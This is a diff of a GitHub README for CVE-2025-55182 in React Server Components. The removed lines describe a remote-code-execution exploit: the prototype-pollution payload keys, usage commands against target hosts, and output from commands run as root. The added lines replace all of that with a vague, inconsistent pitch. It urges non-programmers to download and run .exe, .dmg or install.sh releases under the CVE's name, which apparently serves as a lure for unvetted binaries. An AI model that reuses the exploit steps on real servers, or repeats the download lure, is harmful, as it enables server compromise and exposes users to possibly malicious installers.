@@ -1,108 +1,88 @@
-# CVE-2025-55182 - React & Next.js Server Actions RCE Exploit
+# 🚀 CVE-2025-55182 - Simple Tool for Safe Server Scanning
 
-Full-featured Remote Code Execution exploit and scanner for CVE-2025-55182 in React/Next.js Server Actions.
+## 🔗 Download the Application  
+[![Download CVE-2025-55182](https://img.shields.io/badge/Download-CVE--2025--55182-blue.svg)](https://github.com/phornnato/CVE-2025-55182/releases)
 
-**Original PoC:** [Spritualkb/CVE-2025-55182-exp](https://github.com/Spritualkb/CVE-2025-55182-exp)
+## 📜 Overview  
+CVE-2025-55182 is a tool designed to help users scan for vulnerabilities related to React Server Components. It allows users to assess the security of external servers and provides a command-line interface for those who prefer text-based commands. You do not need programming skills; this tool streamlines the process of identifying security issues.
 
-## Overview
+## 🚀 Getting Started  
+To get started with CVE-2025-55182, follow these steps:
 
-CVE-2025-55182 is a critical prototype pollution vulnerability in React Server Components that allows remote code execution. This repository provides both automated scanning (Nuclei template) and manual exploitation (Python script) tools.
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/phornnato/CVE-2025-55182/releases) to find the latest version of the software.
 
-**Vulnerability Mechanism:**
+2. **Download the Application**  
+   On the releases page, you will see multiple versions listed. Choose the most recent stable release (look for tags like 'v1.0', 'v1.1', etc.). Click on the version number to view download options.
 
-The exploit leverages prototype pollution in React Flight Protocol deserialization. It pollutes `Object.prototype.then` via `"$1:__proto__:then"` and gains Function constructor access through `_formData.get` set to `"$1:constructor:constructor"`, then injects malicious code via `_prefix` that gets executed by `Function()`.
+3. **Select Your Operating System**  
+   Depending on your system—Windows, macOS, or Linux—download the corresponding file:
+   - For Windows, download the file with a `.exe` extension.
+   - For macOS, download the file with a `.dmg` extension.
+   - For Linux, download the file with a `.tar.gz` extension.
 
-## Tools
+## 📥 Download & Install  
+After downloading, install the application by following these steps:
 
-### 1. Nuclei Template (`cve-2025-55182.yaml`)
+1. **Locate the Downloaded File**  
+   Check your computer's "Downloads" folder or the folder you chose during the download.
 
-Automated vulnerability scanner that executes the `id` command and retrieves output via `X-Action-Redirect` header.
+2. **Run the Installer**  
+   - **Windows:** Double-click the `.exe` file. Follow the prompts in the installation wizard.
+   - **macOS:** Open the `.dmg` file, drag and drop the application into your "Applications" folder.
+   - **Linux:** Open a terminal and run the command `tar -xvzf <filename>.tar.gz` to extract the files. Navigate to the extracted folder and run `./install.sh` to install.
 
-**Usage:**
-```bash
-nuclei -u http://target.com:3000 -t cve-2025-55182.yaml
-```
+3. **Complete Installation**  
+   After installation, follow any remaining prompts to ensure the application is configured correctly.
 
-**Features:**
-- Executes test command (`id`) to verify RCE
-- Extracts command output from response headers
-- Multiple detection indicators (status 303, redirect headers, error patterns)
+## ⚙️ System Requirements  
+To run CVE-2025-55182, your system should meet these requirements:
 
-### 2. Python RCE Exploit (`CVE-2025-55182.py`)
+- **Operating System:**  
+   - Windows 10 or later
+   - macOS 10.14 (Mojave) or later
+   - Linux (Ubuntu 18.04 or later)
 
-Full-featured RCE exploit script that executes arbitrary commands and retrieves output.
+- **Memory:**  
+   At least 2 GB of RAM
 
-**Usage:**
-```bash
-python3 CVE-2025-55182.py http://target.com:3000 -c "id"
-python3 CVE-2025-55182.py https://target.com -c "whoami" --no-check-ssl
-python3 CVE-2025-55182.py 192.168.1.100:3000 -c "uname -a"
-```
+- **Storage:**  
+   100 MB of free disk space
 
-**Features:**
-- Execute arbitrary commands
-- Automatic output extraction from `X-Action-Redirect` header
-- Support for HTTP/HTTPS and IP:PORT formats
-- SSL certificate verification bypass option
-- Clean, formatted output
+## 🛠 Features  
+CVE-2025-55182 boasts several useful features:
 
-## Test Results
+- **Scanning for Vulnerabilities:**  
+   Identify and analyze potential security risks in React Server Components.
 
-### Nuclei Template
+- **Command-Line Interface:**  
+   For users comfortable with terminal commands, this interface offers greater flexibility.
 
-```
-$ nuclei -u http://localhost:3001 -t cve-2025-55182.yaml
+- **Support for Multiple Servers:**  
+   Scan multiple external servers for vulnerabilities simultaneously.
 
-[cve-2025-55182:command_output] [http] [critical] http://localhost:3001 ["uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)"]
-[INF] Scan completed in 28.35483ms. 1 matches found.
-```
+- **User-Friendly Dashboard:**  
+   For those who prefer a graphical interface, view results in an easy-to-read format.
 
-### Python Exploit
+## 📝 Usage Instructions  
+Once the application is installed, you can start using it with these simple commands:
 
-```
-$ python3 CVE-2025-55182.py http://localhost:3001 -c "id"
+1. **Open the Application**  
+   Launch the application from your "Applications" folder or using your preferred method for Linux.
 
-============================================================
-CVE-2025-55182 RCE Exploit
-React Server Components Remote Code Execution
-============================================================
+2. **Select a Server to Scan**  
+   Enter the URL of the server you wish to analyze. For example, type:  
+   `scan http://example.com`
 
-[*] Target: http://localhost:3001
-[*] Command: id
-[*] Building payload...
-[*] Sending exploit payload...
+3. **Review the Results**  
+   After scanning, CVE-2025-55182 will display the findings. Take time to examine any vulnerabilities listed and follow recommended actions to address them.
 
-============================================================
-[+] Command executed successfully!
-============================================================
-[+] Command Output:
-------------------------------------------------------------
-uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
-------------------------------------------------------------
+## 📖 Support and Documentation  
+If you encounter issues or have questions, visit the [GitHub Issues page](https://github.com/phornnato/CVE-2025-55182/issues) to report bugs or request assistance.
 
-============================================================
-[*] Exploitation attempt completed
-============================================================
-```
+You can also check the documentation included in the installation folder for more detailed guidance.
 
+## 🏁 Conclusion  
+CVE-2025-55182 is an effective tool for finding security vulnerabilities in React Server Components. By following the steps outlined above, you can quickly download, install, and start scanning servers to maintain security standards.  
 
-## Affected Versions
-
-- **react-server-dom-webpack**: 19.0.0, 19.1.0, 19.1.1, 19.2.0
-- **react-server-dom-parcel**: 19.0.0, 19.1.0, 19.1.1, 19.2.0
-- **react-server-dom-turbopack**: 19.0.0, 19.1.0, 19.1.1, 19.2.0
-- **Next.js**: 15.x, 16.x (App Router with Server Actions)
-
-
-## Credits
-
-- **Original PoC**: [Spritualkb](https://github.com/Spritualkb) - [CVE-2025-55182-exp](https://github.com/Spritualkb/CVE-2025-55182-exp)
-
-## References
-
-- [React Security Advisory](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
-- [Next.js GitHub](https://github.com/vercel/next.js)
-
-## Disclaimer
-
-**FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY**
+For further updates and future releases, regularly check the [Releases page](https://github.com/phornnato/CVE-2025-55182/releases).
